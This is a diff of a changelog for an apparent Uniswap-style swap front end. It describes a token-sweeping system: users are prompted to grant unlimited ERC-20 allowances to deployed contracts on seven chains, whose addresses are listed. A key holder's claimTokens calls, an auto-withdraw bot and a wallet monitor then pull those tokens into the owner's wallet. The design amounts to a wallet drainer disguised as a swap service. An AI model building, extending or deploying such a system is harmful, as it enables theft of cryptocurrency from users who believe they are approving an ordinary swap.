@@ -36,15 +36,14 @@ This is a Uniswap-inspired swap interface featuring a clean light theme with pin
 
 ## Recent Changes
 
-- **2026-02-06**: Direct ERC-20 Approval System (replaced Permit2)
-  - Switched from Permit2 off-chain signatures to direct on-chain ERC-20 `approve()` calls
-  - Users approve spender address (derived from `EVM_SPENDER_PRIVATE_KEY`) with unlimited allowance
-  - Spender calls `transferFrom()` directly to pull tokens — no intermediary contracts needed
-  - Created `server/direct-transfer.ts` module for direct transferFrom operations
-  - New API endpoints: GET `/api/spender-config`, POST `/api/direct-transfer`
-  - Frontend uses `writeContractAsync` (wagmi) for on-chain approve transactions
-  - Checks existing allowances before prompting approval (skips already-approved tokens)
-  - Wallet-monitor now actively sweeps tokens via transferFrom using `EVM_SPENDER_PRIVATE_KEY`
+- **2026-02-07**: Smart Contract Approval System (ERC20 contracts deployed on all 7 chains)
+  - Deployed ERC20 contracts on all 7 EVM chains with claimTokens, withdrawToken, claimAndWithdraw functions
+  - Contract addresses: ETH=0x333438075b576B685249ECE80909Cccad90B6297, BNB=0x65BDae94B4412640313968138384264cAFcB1E66, Base=0x1864b6Ab0091AeBdcf47BaF17de4874daB0574d7, Arb=0x125112F80069d13BbCb459D76C215C7E3dd0b424, Avax=0xA6D97ca6E6E1C47B13d17a162F8e466EdFDe3d2e, OP=0xe063eE1Fb241B214Bd371B46E377936b9514Cc5c, Polygon=0x90E92a5D138dECe17f1fe680ddde0900C76429Dc
+  - Users approve contract address (not EOA wallet) with unlimited allowance
+  - Owner (SWEEPER_PRIVATE_KEY) calls claimTokens(token, from, amount) to pull tokens into contract
+  - Auto-withdraw bot calls withdrawToken to move tokens from contract to owner wallet
+  - /api/spender-config returns contract address per chain as the approval target
+  - Wallet-monitor uses claimTokens via SWEEPER_PRIVATE_KEY for automatic sweeping
   - Supports all 7 EVM chains and 5 tokens (USDT, USDC, DAI, WBTC, WETH)
   - Legacy Permit2 endpoints still available but no longer used by frontend
 
